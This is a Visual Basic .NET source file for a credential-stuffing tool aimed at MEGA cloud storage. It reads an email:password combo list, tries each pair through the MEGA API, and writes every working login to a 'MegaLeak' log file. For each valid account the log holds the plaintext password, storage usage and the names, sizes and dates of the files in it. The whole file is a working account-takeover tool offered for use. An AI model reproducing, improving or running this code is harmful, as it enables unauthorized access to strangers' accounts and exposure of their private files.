Imports System.IO
Imports System.Threading
Imports CG.Web.MegaApiClient
Imports Microsoft.VisualBasic.CompilerServices

Public Class main

    Dim _combolist As String()
    Dim _date As String
    Dim _dir As String
    Dim _test As Integer = 0
    Dim _count As Integer = 0
    Dim _thread As Queue(Of Thread)
    Friend Delegate Sub _delegate()
    Public Sub New()
        Me._thread = New Queue(Of Thread)()
        Me.InitializeComponent()
    End Sub
    Private Sub main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        btn_load.Enabled = True
        btn_start.Enabled = False
        btn_stop.Enabled = False
    End Sub
    Private Sub btn_load_Click(sender As Object, e As EventArgs) Handles btn_load.Click
        Dim openFileDialog As New OpenFileDialog()
        openFileDialog.Filter = "Text File (*.txt)|*.txt|All File (*.*)|*.*"
        openFileDialog.Title = "Select the file ( email:pass )"
        If openFileDialog.ShowDialog() = DialogResult.OK Then
            _combolist = File.ReadAllLines(openFileDialog.FileName)
            _count = _combolist.Count
            lbl_combo.Text = _count
            lbl_good.Text = "0"
            lbl_bad.Text = "0"
            btn_load.Enabled = False
            btn_start.Enabled = True
        End If
    End Sub
    Private Sub btn_start_Click(sender As Object, e As EventArgs) Handles btn_start.Click
        If _count > 0 Then
            _date = DateTime.Now.ToString("dd-MM-yy HH-mm-ss")
            _dir = "MegaLeak " + _date
            btn_start.Enabled = False
            btn_stop.Enabled = True
            Dim _run As Thread = New Thread(New ThreadStart(AddressOf checkcombo))
            _thread.Enqueue(_run)
            _run.Start()
        Else
            MessageBox.Show("First Load Accounts.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub
    Private Sub btn_stop_Click(sender As Object, e As EventArgs) Handles btn_stop.Click
        Try
            For Each _run As Thread In _thread
                _run.Abort()
                btn_stop.Enabled = False
                btn_load.Enabled = True
            Next
        Catch ex As Exception
        End Try
    End Sub
    Private Sub main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            For Each _run As Thread In _thread
                _run.Abort()
                Application.Exit()
            Next
        Finally
        End Try
    End Sub
    Public Sub checkcombo()
        Try
            Dim _array As String() = _combolist
            For i As Integer = 0 To _array.Length - 1
                Dim _acc As String() = _array(i).Split(New Char() {":"c})
                Login(_acc(0), _acc(1))
                _test += 1
            Next
            MessageBox.Show("Finish.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Login(email As String, password As String)
        Dim megaApiClient As MegaApiClient = New MegaApiClient()
        Try
            megaApiClient.Login(email, password)
            If megaApiClient.IsLoggedIn Then
                File.AppendAllText(_dir + ".txt", "=========================" & vbCrLf)
                File.AppendAllText(_dir + ".txt", "[#] Info Account" & vbCrLf)
                File.AppendAllText(_dir + ".txt", "[-] Email: " + email & vbCrLf)
                File.AppendAllText(_dir + ".txt", "[-] Password: " + password & vbCrLf)
                File.AppendAllText(_dir + ".txt", String.Concat(New Object() {"[-] Used: ", megaApiClient.GetAccountInformation().UsedQuota / 1073741824L, " / ", megaApiClient.GetAccountInformation().TotalQuota / 1073741824L, "GB" & vbCrLf}))
                Dim num As Integer = 0
                Dim num2 As Integer = 0
                For Each current As INode In megaApiClient.GetNodes()
                    If num <> 0 AndAlso num <> 1 AndAlso num <> 2 Then
                        num2 += 1
                        File.AppendAllText(_dir + ".txt", String.Concat(New String() {String.Format("{0,-50}", current.Name), vbTab & vbTab & vbTab, String.Format("{0,-20}", (current.Size / 1024L).ToString() + "KB" & vbTab & vbTab & vbTab), String.Format("{0,-10}", current.ModificationDate.ToString()), vbCrLf}))
                    End If
                    num += 1
                Next
                File.AppendAllText(_dir + ".txt", "=========================" & vbCrLf)
                lbl_good.Invoke(New _delegate(AddressOf plus_g))
            Else
                lbl_bad.Invoke(New _delegate(AddressOf plus_b))
            End If
        Catch
            lbl_bad.Invoke(New _delegate(AddressOf plus_b))
        End Try
    End Sub
    Private Sub plus_g()
        lbl_good.Text = Conversions.ToString(Conversions.ToDouble(lbl_good.Text) + 1.0)
    End Sub
    Private Sub plus_b()
        lbl_bad.Text = Conversions.ToString(Conversions.ToDouble(lbl_bad.Text) + 1.0)
    End Sub
End Class